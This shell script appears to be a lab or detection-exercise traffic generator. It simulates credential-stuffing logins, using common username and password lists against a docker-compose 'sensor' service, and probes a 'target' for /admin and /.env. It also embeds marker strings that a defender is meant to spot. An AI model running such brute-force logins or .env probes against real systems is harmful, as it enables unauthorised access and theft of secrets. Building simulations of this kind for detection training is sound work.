#!/bin/sh
# ──────────────────────────────────────────────────────────────────────
# Automated brute-force attack simulation: Aegis Security Corp
#
# This script simulates a credential stuffing attack against the
# authentication portal. It sends HTTP POST login requests with
# different username/password combinations every 3 seconds. Most
# attempts fail, but every ~30 seconds a "successful" login is sent
# with a campaign tracking marker.
#
# It also probes the corporate web portal with a distinctive
# User-Agent string (AegisCracker/bl0ck).
#
# Attack cadence: ~3 second intervals
# ──────────────────────────────────────────────────────────────────────

# Wait for target services to initialize
sleep 20

# Resolve targets by docker-compose service name
SENSOR="sensor"
TARGET="target"

echo "[*] Brute-force attack loop starting, targeting ${SENSOR} and ${TARGET}"

# Username/password wordlists for brute-force simulation
USERNAMES="admin root user operator sysadmin guest backup service deploy monitor"
PASSWORDS="password 123456 admin1234 letmein qwerty welcome shadow master dragon trustno1"

CYCLE=0

while true; do
    CYCLE=$((CYCLE + 1))

    # ── Failed login attempts (brute-force) ────────────────────────
    # Pick a random username and password for each attempt
    for USERNAME in $USERNAMES; do
        for PASSWORD in $PASSWORDS; do
            # Send failed login POST request with exfil tracking tag
            curl -s -m 5 \
                -X POST "http://${SENSOR}/login" \
                -H "Content-Type: application/x-www-form-urlencoded" \
                -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
                -d "username=${USERNAME}&password=${PASSWORD}&exfil=d3t3ct" \
                > /dev/null 2>&1

            sleep 3

            # Only send a handful of attempts per cycle (not the full cartesian product)
            # Break inner loop after 3 attempts
            break
        done

        # Break outer loop after 8 attempts per cycle
        if [ "$((CYCLE % 2))" -eq 0 ] && [ "$(echo "$USERNAME" | wc -c)" -gt 5 ]; then
            break
        fi
    done

    # ── Successful login attempt (campaign marker) ─────────────────
    # Every cycle (~30s), send the "successful" login with campaign tag
    curl -s -m 5 \
        -X POST "http://${SENSOR}/login" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
        -d "username=admin&password=Sup3rS3cr3t!&campaign=brut3" \
        > /dev/null 2>&1

    sleep 3

    # ── Web portal reconnaissance ──────────────────────────────────
    # Probes the corporate web portal with a distinctive User-Agent
    curl -s -m 5 \
        "http://${TARGET}/admin" \
        -H "User-Agent: AegisCracker/bl0ck" \
        > /dev/null 2>&1

    curl -s -m 5 \
        "http://${TARGET}/login?user=admin" \
        -H "User-Agent: AegisCracker/bl0ck" \
        > /dev/null 2>&1

    curl -s -m 5 \
        "http://${TARGET}/.env" \
        -H "User-Agent: AegisCracker/bl0ck" \
        > /dev/null 2>&1

    sleep 3
done
